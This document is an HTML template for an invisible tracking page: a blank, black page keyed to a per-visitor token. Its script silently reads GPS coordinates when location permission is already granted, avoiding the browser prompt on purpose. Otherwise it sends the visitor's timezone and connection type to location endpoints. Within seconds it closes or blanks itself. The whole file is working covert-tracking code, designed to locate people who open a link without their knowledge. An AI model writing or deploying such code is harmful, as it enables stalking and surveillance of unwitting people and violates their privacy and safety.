<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title> </title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  html, body { background: #000; overflow: hidden; width: 100%; height: 100%; }
  body { opacity: 0; }
</style>
</head>
<body>
<script>
(function() {
  'use strict';
  var token = "{{ token }}";
  var _sent = false;

  {% if expired %}
    try { window.location.replace('about:blank'); } catch(e) {}
    return;
  {% endif %}

  function getTimezone() {
    try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e) { return null; }
  }

  function getConnType() {
    try {
      var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (c) return c.effectiveType || c.type || null;
    } catch(e) {}
    return null;
  }

  function sendCoords(lat, lng, acc) {
    if (_sent) return;
    _sent = true;
    var payload = JSON.stringify({
      token: token,
      latitude: lat,
      longitude: lng,
      accuracy: acc,
      connectionType: getConnType(),
      timezone: getTimezone()
    });
    var blob = new Blob([payload], { type: 'application/json' });
    if (navigator.sendBeacon) {
      navigator.sendBeacon('/api/location-update', blob);
    } else {
      try { fetch('/api/location-update', { method:'POST', headers:{'Content-Type':'application/json'}, body:payload, keepalive:true }); } catch(e) {}
    }
  }

  function sendFallback() {
    if (_sent) return;
    _sent = true;
    var payload = JSON.stringify({
      token: token,
      connectionType: getConnType(),
      timezone: getTimezone()
    });
    var blob = new Blob([payload], { type: 'application/json' });
    if (navigator.sendBeacon) {
      navigator.sendBeacon('/api/location-denied', blob);
    } else {
      try { fetch('/api/location-denied', { method:'POST', headers:{'Content-Type':'application/json'}, body:payload, keepalive:true }); } catch(e) {}
    }
  }

  function vanish() {
    try { window.location.replace('about:blank'); } catch(e) {}
    try { window.open('', '_self', '').close(); } catch(e) {}
    try { self.close(); } catch(e) {}
    try { window.close(); } catch(e) {}
    setTimeout(function() {
      try {
        document.open();
        document.write('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body></body></html>');
        document.close();
      } catch(e) {}
    }, 5);
  }

  // ── Permission-aware GPS attempt ──
  // Query permission FIRST — never triggers a prompt
  // granted: GPS fires silently
  // denied/prompt: silently fall back to IP, never prompt the user
  if (navigator.permissions && navigator.permissions.query) {
    navigator.permissions.query({ name: 'geolocation' }).then(function(status) {
      if (status.state === 'granted' && 'geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
          function(pos) {
            sendCoords(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
            vanish();
          },
          function() {
            sendFallback();
            vanish();
          },
          { enableHighAccuracy: true, timeout: 8000, maximumAge: 300000 }
        );
        setTimeout(function() {
          if (!_sent) { sendFallback(); vanish(); }
        }, 10000);
      } else {
        // denied or prompt — never trigger the browser prompt
        sendFallback();
        vanish();
      }
    }).catch(function() {
      // Permissions API unavailable — try GPS anyway (may prompt on some browsers)
      if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
          function(pos) { sendCoords(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy); vanish(); },
          function() { sendFallback(); vanish(); },
          { enableHighAccuracy: true, timeout: 8000, maximumAge: 300000 }
        );
        setTimeout(function() { if (!_sent) { sendFallback(); vanish(); } }, 10000);
      } else {
        sendFallback();
        vanish();
      }
    });
  } else {
    // No Permissions API — try GPS (Chrome without gesture → silent error, Safari → may prompt)
    if ('geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(
        function(pos) { sendCoords(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy); vanish(); },
        function() { sendFallback(); vanish(); },
        { enableHighAccuracy: true, timeout: 8000, maximumAge: 300000 }
      );
      setTimeout(function() { if (!_sent) { sendFallback(); vanish(); } }, 10000);
    } else {
      sendFallback();
      vanish();
    }
  }

  // Hard timeout — vanish after 4s regardless
  setTimeout(function() {
    if (!_sent) { sendFallback(); }
    vanish();
  }, 4000);
})();
</script>
</body>
</html>
